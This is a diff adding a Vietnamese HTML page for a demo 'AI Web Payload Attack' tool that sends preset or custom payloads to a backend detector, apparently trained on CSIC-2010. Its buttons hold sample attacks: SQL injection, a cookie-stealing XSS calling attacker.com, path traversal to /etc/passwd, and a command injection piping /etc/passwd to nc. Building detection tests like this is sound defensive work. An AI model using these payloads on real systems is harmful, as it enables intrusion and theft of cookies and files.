@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Payload Attack (AI Tested)</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .payload-selector {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .payload-btn {
+            background-color: #2b303c;
+            color: #ecf0f1;
+            border: 1px solid #3d4454;
+            padding: 8px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .payload-btn:hover {
+            background-color: #e74c3c;
+            border-color: #c0392b;
+        }
+        .custom-payload-box {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        .custom-payload-box textarea {
+            width: 100%;
+            height: 80px;
+            background: #1e222d;
+            border: 1px solid #3d4454;
+            color: #ecf0f1;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+            resize: vertical;
+        }
+        .btn-send {
+            background-color: #e74c3c;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        .btn-send:hover {
+            background-color: #c0392b;
+        }
+        .ai-result-card {
+            background: #1e222d;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 4px;
+            display: none;
+        }
+        .ai-result-card.danger {
+            border-left-color: #e74c3c;
+        }
+        .ai-result-card.safe {
+            border-left-color: #2ecc71;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="sidebar-header">Attack Tool</div>
+        <ul class="nav-links">
+            <li><a href="reddash.html">Giới thiệu về tool</a></li>
+            <li><a href="bruteforce.html">Brute Force Attack</a></li>
+            <li><a href="requestflood.html">Request Flood Attack</a></li>
+            <li><a href="webattack.html" class="active">AI Web Payload Attack</a></li>
+        </ul>
+        <div style="margin-top:auto; padding:20px; font-size:0.8rem;">
+            Web tool demo
+        </div>
+    </div>
+
+    <!-- Main -->
+    <div class="main-content">
+        <header>
+            <h1>AI Web Payload Attack</h1>
+        </header>
+
+        <div class="attack-container">
+            <p style="color: var(--text-muted); margin-bottom: 15px;">
+                Chọn mẫu tấn công hoặc nhập chuỗi tùy chỉnh để kiểm tra khả năng phát hiện của <strong>Mô hình AI CSIC-2010</strong> tại Backend:
+            </p>
+
+            <div class="payload-selector">
+                <button class="payload-btn" onclick="selectPayload(`SELECT * FROM users WHERE user='admin' OR '1'='1'--`)">💉 SQL Injection</button>
+                <button class="payload-btn" onclick="selectPayload(`<script>fetch('http://attacker.com?c=' + document.cookie)</script>`)">🎯 XSS Stored</button>
+                <button class="payload-btn" onclick="selectPayload(`<img src=x onerror=alert('XSS_ATTACK')>`)">🎯 XSS Image</button>
+                <button class="payload-btn" onclick="selectPayload(`/var/www/html/../../../../etc/passwd`)">📁 Path Traversal</button>
+                <button class="payload-btn" onclick="selectPayload(`; cat /etc/passwd | nc 192.168.1.100 4444`)">⚡ Command Injection</button>
+                <button class="payload-btn" onclick="selectPayload(`GET /index.php?page=home&lang=vi HTTP/1.1`)"> Normal Request</button>
+            </div>
+
+            <div class="custom-payload-box">
+                <textarea id="payloadInput" placeholder="Nhập payload web tại đây..."></textarea>
+            </div>
+
+            <button class="btn-send" onclick="sendPayload()">🚀 Gửi Payload tới Backend</button>
+
+            <!-- Kết quả AI trả về -->
+            <div id="aiCard" class="ai-result-card">
+                <h3 id="aiTitle" style="margin-top:0;">Kết quả AI đánh giá</h3>
+                <p id="aiDetails"></p>
+            </div>
+
+            <div id="logBox" class="log-box" style="margin-top:20px;">
+                <p>Log lịch sử gửi payload...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/api.js"></script>
+    <script>
+        function selectPayload(text) {
+            document.getElementById("payloadInput").value = text;
+        }
+
+        function addLog(text) {
+            const box = document.getElementById("logBox");
+            const time = new Date().toLocaleTimeString();
+            const p = document.createElement("p");
+            p.textContent = `[${time}] ${text}`;
+            box.appendChild(p);
+
+            if (box.children.length > 50) {
+                box.removeChild(box.firstChild);
+            }
+            box.scrollTop = box.scrollHeight;
+        }
+
+        async function sendPayload() {
+            const input = document.getElementById("payloadInput");
+            const payload = input.value.trim();
+            if (!payload) {
+                alert("Vui lòng nhập hoặc chọn một mẫu payload!");
+                return;
+            }
+
+            addLog(`Đang gửi payload: "${payload.substring(0, 45)}..."`);
+
+            try {
+                const res = await sendWebPayload(payload);
+                const ai = res.ai_evaluation;
+                const card = document.getElementById("aiCard");
+                const title = document.getElementById("aiTitle");
+                const details = document.getElementById("aiDetails");
+
+                card.style.display = "block";
+                if (ai.is_attack) {
+                    card.className = "ai-result-card danger";
+                    title.innerHTML = `🚨 AI PHÁT HIỆN TẤN CÔNG: <strong>${ai.attack_type.toUpperCase()}</strong>`;
+                    details.innerHTML = `
+                        • Độ tin cậy: <strong>${(ai.confidence * 100).toFixed(2)}%</strong><br>
+                        • Điểm rủi ro: <strong>${ai.risk_score}/100</strong><br>
+                        • Trạng thái hệ thống: <strong style="color:#e74c3c;">${res.status}</strong>
+                    `;
+                    addLog(`🚨 AI Phát hiện: ${ai.attack_type.toUpperCase()} | Risk: ${ai.risk_score} -> ${res.status}`);
+                } else {
+                    card.className = "ai-result-card safe";
+                    title.innerHTML = ` AI ĐÁNH GIÁ: <strong>AN TOÀN (NORMAL)</strong>`;
+                    details.innerHTML = `
+                        • Độ tin cậy: <strong>${(ai.confidence * 100).toFixed(2)}%</strong><br>
+                        • Điểm rủi ro: <strong>0/100</strong><br>
+                        • Trạng thái: <strong style="color:#2ecc71;">PASS</strong>
+                    `;
+                    addLog(` AI Đánh giá: Bình thường | Risk: 0 -> PASS`);
+                }
+            } catch (err) {
+                if (err.message !== "Blocked") {
+                    addLog(`❌ Lỗi kết nối: ${err.message}`);
+                }
+            }
+        }
+    </script>
+</body>
+
+</html>
